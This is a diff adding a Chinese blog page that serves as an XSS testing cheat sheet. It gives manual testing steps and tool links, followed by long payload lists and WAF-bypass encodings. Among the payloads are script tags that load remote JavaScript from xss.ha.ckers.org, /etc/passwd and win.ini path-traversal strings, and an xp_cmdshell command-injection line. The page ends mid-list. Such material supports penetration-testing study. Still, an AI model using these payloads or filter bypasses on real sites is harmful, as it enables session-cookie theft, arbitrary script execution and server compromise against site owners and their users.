@@ -1,0 +1,675 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title> | 剣の魔王の小窝</title>
+    <meta name="author" content="剣の魔王" />
+    <meta name="description" content="这个网站没有描述" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/head.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+<link rel="preconnect" href="https://static-argvchs.netlify.app" />
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+
+			<canvas
+			id="fireworks"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+			</canvas>
+			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+			<script src="/js/lib/fireworks.min.js"></script>
+			
+			<canvas
+			id="background"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+			<script src="/js/lib/background.min.js"></script>
+
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>剣の魔王の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1></h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/5
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="一、XSS的测试技巧和工具："><a href="#一、XSS的测试技巧和工具：" class="headerlink" title="一、XSS的测试技巧和工具："></a>一、XSS的测试技巧和工具：</h2><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p>1、工具扫描：APPscan、awvs、burpsuite、XSSER XSSF</p>
+<p>2、手动测试：Burpsuite、firefox(hackbar)<br>      1）在目标站点上找到输入点,比如查询接口,留言板等;<br>      2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;<br>      3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执      行,如果成功执行则说明存在XSS漏洞;<span id="more"></span></p>
+<p>​      <strong>第一种情况：可得知输出位置</strong><br>​      输入一些敏感字符，例如、”、’、()等等，在提交请求后去查看HTML源代码，看这些输入的字符是否被转义。<br>​      在输出这些敏感字符的时候，很有可能程序已经做过了过滤，那么你在寻找这些字符的时候就不是那么容易了，这时候你可以直接输       入 <code>XXSER&lt;&gt;&quot;&#39;&amp;</code>，然后在查找源代码的时候直接进行查找XXSER或许比较方便一些。</p>
+<p>​      <strong>第二种情况：无法得知输出位置</strong><br>​      非常多的Web应用程序源代码是不对外开放的，这时在进行测试XSS时就有可能无法得知输入数据到底在何处显示，比如测试某留言      本是否存在XSS，那么在留言之后，你必须要经过管理员的审核才能进行显示，这时你是无法得知，你输入的数据在后台管理页面处于      何种状态。</p>
+<h3 id="万能XSS漏洞payload"><a href="#万能XSS漏洞payload" class="headerlink" title="万能XSS漏洞payload"></a>万能XSS漏洞payload</h3><pre><code>&quot;/&gt;&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p><strong>三种弹窗函数</strong><br>仅弹窗：alart<br>弹输入框：prompt<br>弹是否：confirm</p>
+<h3 id="XSS辅助工具"><a href="#XSS辅助工具" class="headerlink" title="XSS辅助工具"></a>XSS辅助工具</h3><ol>
+<li>beef：<a target="_blank" rel="noopener" href="https://beefproject.com/">https://beefproject.com/</a><br>一个xss攻击框架，参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/175755.html">https://www.freebuf.com/articles/web/175755.html</a></li>
+<li>xssor：<a target="_blank" rel="noopener" href="http://xssor.io/">http://xssor.io</a><br>免费的JavaScript在线入侵工具</li>
+<li>xss平台：<br>在线的xss平台,有很多，自行搜索</li>
+<li>ie tester：<a target="_blank" rel="noopener" href="http://www.ietester.cn/">http://www.ietester.cn/</a><br>可以模拟测试各种版本的老IE浏览器</li>
+</ol>
+<h2 id="二、XSS-payload及绕过"><a href="#二、XSS-payload及绕过" class="headerlink" title="二、XSS payload及绕过"></a>二、XSS payload及绕过</h2><h3 id="常用payload-1"><a href="#常用payload-1" class="headerlink" title="常用payload(1)"></a>常用payload(1)</h3><pre><code class="javascript">&#39;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+ =&#39;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+ &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+ &lt;script&gt;alert(vulnerable)&lt;/script&gt;
+ %3Cscript%3Ealert(&#39;XSS&#39;)%3C/script%3E
+ &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+ &lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;
+ %0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp
+ %22%3cscript%3ealert(%22xss%22)%3c/script%3e
+ %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+ %2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
+ %3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+ %3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+ %3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
+ %3f.jsp
+ %3f.jsp
+ &lt;script&gt;alert(&#39;Vulnerable&#39;);&lt;/script&gt;
+ &lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;
+ ?sql_debug=1
+ a%5c.aspx
+ a.jsp/&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;
+ a/
+ a?&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;
+ &quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;/script&gt;
+ &#39;;exec%20master..xp_cmdshell%20&#39;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#39;--&amp;&amp;
+ %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+ %3Cscript%3Ealert(document. domain);%3C/script%3E&amp;
+ %3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=
+ &lt;IMG src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &lt;IMG src=javascript:alert(&#39;XSS&#39;)&gt;
+ &lt;IMG src=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;
+ &lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;
+ &lt;IMG src=javascript:alert(&#39;XSS&#39;)&gt;
+ &lt;IMG src=javascript:alert(&#39;XSS&#39;)&gt;
+ &lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+ &lt;IMG src=&quot;jav ascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &lt;IMG src=&quot;jav ascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &lt;IMG src=&quot;jav ascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39; &gt; out
+ &lt;IMG src=&quot; javascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;
+ &lt;BODY BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;
+ &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;
+ &lt;IMG DYNSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;
+ &lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;
+ &lt;BGSOUND src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &lt;br size=&quot;&amp;&#123;alert(&#39;XSS&#39;)&#125;&quot;&gt;
+ &lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;
+ &lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &lt;IMG src=&#39;vbscript:msgbox(&quot;XSS&quot;)&#39;&gt;
+ &lt;IMG src=&quot;mocha:[code]&quot;&gt;
+ &lt;IMG src=&quot;livescript:[code]&quot;&gt;
+ &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &lt;IFRAME src=javascript:alert(&#39;XSS&#39;)&gt;&lt;/IFRAME&gt;
+ &lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&#39;XSS&#39;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;
+ &lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;
+ &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;
+ &lt;DIV STYLE=&quot;behaviour: url(&#39;http://www.how-to-hack.org/exploit.html&#39;);&quot;&gt;
+ &lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;
+ &lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;
+ &lt;IMG STYLE=&#39;xss:expre\ssion(alert(&quot;XSS&quot;))&#39;&gt;
+ &lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&#39;XSS&#39;);&lt;/STYLE&gt;
+ &lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;
+ &lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)&#125;&lt;/STYLE&gt;
+ &lt;BASE href=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;
+ getURL(&quot;javascript:alert(&#39;XSS&#39;)&quot;)
+ a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#39;XSS&#39;);&quot;;eval(a+b+c+d);
+ &lt;XML src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+ &quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&#39;XSS&#39;);&#125;&lt;/SCRIPT&gt;&lt;&quot;
+ &lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
+ &lt;IMG src=&quot;javascript:alert(&#39;XSS&#39;)&quot;
+ &lt;!--#exec cmd=&quot;/bin/echo &#39;&lt;SCRIPT SRC&#39;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#39;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#39;&quot;--&gt;
+ &lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+ &lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+ &lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+ &lt;SCRIPT a=&quot;&gt;&quot; &#39;&#39; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+ &lt;SCRIPT &quot;a=&#39;&gt;&#39;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+ &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+ &lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;
+</code></pre>
+<h3 id="常用payload-2"><a href="#常用payload-2" class="headerlink" title="常用payload(2)"></a>常用payload(2)</h3><pre><code class="javascript">&quot;&quot; onclick=&quot;alert(1)&quot;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;script&gt;alert(1);&lt;/sciript&gt;
+&lt;img src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;
+&lt;a href=javascript:alert(&#39;1&#39;)&gt;test&lt;/a&gt;
+&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+</code></pre>
+<pre><code class="javascript">&lt;script&gt;alert(1);&lt;/sciript&gt;
+</code></pre>
+<pre><code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt; # 图片加载错误时触发
+&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt; # 鼠标指针移动到元素时触发
+&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt; # 鼠标指针移出时触发
+&lt;img src=1 onmouseout=&quot;alert(1&quot;)&gt; # 鼠标指针移出时触发
+</code></pre>
+<pre><code>&lt;a href=&quot;http://www.qq.com&quot;&gt;qq&lt;/a&gt;
+&lt;a href=javascript:alert(&#39;1&#39;)&gt;test&lt;/a&gt;
+&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;
+&lt;a href=&quot;&quot; onclick=eval(alert(&#39;xss&#39;))&gt;aa&lt;/a&gt;
+&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#39;xss&#39;) y=2016&gt;aa&lt;/a&gt;
+</code></pre>
+<pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt; # 竞争焦点，从而触发onblur事件
+&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt; # 通过autofocus属性执行本身的focus事件，这个变量是使焦点自动跳转到输入元素上,触发焦点事件，无需用户去触发
+&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;
+&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;
+&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;
+&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; # 按下按键时触发
+&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt; # 按下按键时触发
+&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;# 松开按键式时触发
+&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;
+</code></pre>
+<pre><code>&lt;form action=javascript:alert(&#39;xss&#39;) method=&quot;get&quot;&gt;&lt;form action=javasript:laert(&#39;xss&#39;)&gt;&lt;form action=1 onmouseover=alert(&#39;xss)&gt;
+</code></pre>
+<h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h4><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;
+&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
+&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;
+</code></pre>
+<pre><code>&lt;svg onload=alert(1)&gt;
+</code></pre>
+<pre><code>&lt;body onload=&quot;alert(1)&quot;&gt; # 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
+&lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
+</code></pre>
+<pre><code>&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt; # 元素上点击鼠标时触发
+</code></pre>
+<pre><code>&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt; # 元素上按下鼠标时触发
+&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt; # 元素上释放鼠标时触发
+</code></pre>
+<pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt; # 使用open属性触发ontoggle事件，无需用户去触发
+&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;
+</code></pre>
+<pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt; # 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+&lt;select onfocus=alert(1) autofocus&gt;
+</code></pre>
+<pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;
+</code></pre>
+<pre><code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;
+</code></pre>
+<p>//仅限火狐</p>
+<pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; 
+</code></pre>
+<p>javascript伪协议</p>
+<pre><code class="javascript">&lt;a&gt;标签
+&lt;a href=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;xss&lt;/a&gt;
+
+&lt;iframe&gt;标签
+&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;
+
+&lt;img&gt;标签
+&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下
+
+&lt;form&gt;标签
+&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;
+</code></pre>
+<h4 id="文件上传xss"><a href="#文件上传xss" class="headerlink" title="文件上传xss"></a>文件上传xss</h4><p>在文件上传处，存在任意文件上传，但是对应的脚本不解析，可以混一个htmlxss</p>
+<p>html-xss</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+    &lt;img src=1 onerror=alert(1)&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>xml-xss</p>
+<pre><code class="xml">&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/something:script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="二、waf绕过"><a href="#二、waf绕过" class="headerlink" title="二、waf绕过"></a>二、waf绕过</h2><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>用 / 代替空格</p>
+<pre><code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p>大小写绕过</p>
+<pre><code>&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<p>双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过，这要根据实战情况下进行改写)</p>
+<pre><code>&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<p>字符拼接<br>1、比如过滤的是alert(利用eval，不仅仅在img标签中其他标签照样适用可以不断进行改写)<br>2、(利用top，不仅仅在script标签中其他标签照样适用可以不断进行改写)</p>
+<pre><code>&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;
+</code></pre>
+<p>其它字符混淆：有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了</p>
+<pre><code>利用注释符
+&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;
+&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;
+标签的优先级
+&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt;
+因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
+&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;
+</code></pre>
+<p>编码绕过</p>
+<pre><code>Unicode编码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;
+
+url编码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
+
+Ascii码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;
+
+Hex绕过
+&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;
+
+八进制绕过
+&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;
+
+base64绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
+</code></pre>
+<h4 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h4><pre><code>当括号被过滤的时候可以使用throw来绕过&lt;svg/onload=&quot;window.οnerrοr=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;
+</code></pre>
+<h4 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h4><ul>
+<li>使用url编码</li>
+<li>html标签中用//可以代替http://使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)</li>
+<li>使用中文逗号代替英文逗号</li>
+</ul>
+<pre><code>使用url编码
+&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;
+
+使用不同进制
+&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制
+&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制
+&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制
+&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;
+
+使用中文逗号代替英文逗号
+&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度
+</code></pre>
+<p>注意如果有的src直接插入的话，可以使用<code>&lt;img src=&quot;x&quot; onerror=console.log(alert(document.cookie));&gt;</code>来测试</p>
+<pre><code>限制 &quot; 符号，输入&lt;img src=1 οnclick=alert(&#39;1&#39;)&gt;
